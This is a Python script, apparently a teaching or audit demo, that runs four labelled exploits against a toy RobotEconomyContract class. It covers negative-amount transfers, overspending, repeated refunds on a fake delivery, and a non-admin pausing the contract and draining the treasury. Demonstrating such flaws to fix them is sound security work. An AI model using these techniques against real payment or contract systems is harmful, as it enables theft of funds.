from contract import RobotEconomyContract

print("=" * 50)
print("EXPLOIT 1: Negative Amount (Theft)")
print("=" * 50)
c = RobotEconomyContract()
print(f"Before - Bob: {c.balances['bob']}, robot_01: {c.balances['robot_01']}")
beforeBalanceBob = c.balances['bob']

c.pay_robot("bob", "robot_01", -400)  # negative amount!



print(f"After  - Bob: {c.balances['bob']}, robot_01: {c.balances['robot_01']}")
print("Result: Bob gained ", (c.balances['bob'] - beforeBalanceBob), " tokens from robot_01 using a negative amount!\n")


print("=" * 50)
print("EXPLOIT 2: Spend More Than Balance")
print("=" * 50)
c = RobotEconomyContract()
print(f"Before - Alice: {c.balances['alice']}, robot_01: {c.balances['robot_01']}")

c.pay_robot("alice", "robot_01", 9999)  # alice only has 1000!

print(f"After  - Alice: {c.balances['alice']}, robot_01: {c.balances['robot_01']}")
print("Result: Alice went negative — tokens created out of thin air!\n")


print("=" * 50)
print("EXPLOIT 3: Infinite Refund (Free Money)")
print("=" * 50)
c = RobotEconomyContract()
print(f"Before - Alice: {c.balances['alice']}")

for i in range(5):
    c.request_refund("alice", "fake_delivery", 500)

print(f"After  - Alice: {c.balances['alice']}")
print("Result: Alice called refund 5x on a fake delivery — gained 2500 tokens!\n")


print("=" * 50)
print("EXPLOIT 4: Anyone Can Pause + Drain Treasury")
print("=" * 50)
c = RobotEconomyContract()
print(f"Before - Bob: {c.balances['bob']}, admin: {c.balances['admin']}, paused: {c.is_paused}")

c.pause_contract("bob")                      # bob is NOT admin!
c.withdraw_emergency_funds("bob", 5000)      # bob is NOT admin!

print(f"After  - Bob: {c.balances['bob']}, admin: {c.balances['admin']}, paused: {c.is_paused}")
print("Result: Bob froze the contract AND stole 5000 from admin treasury!\n")
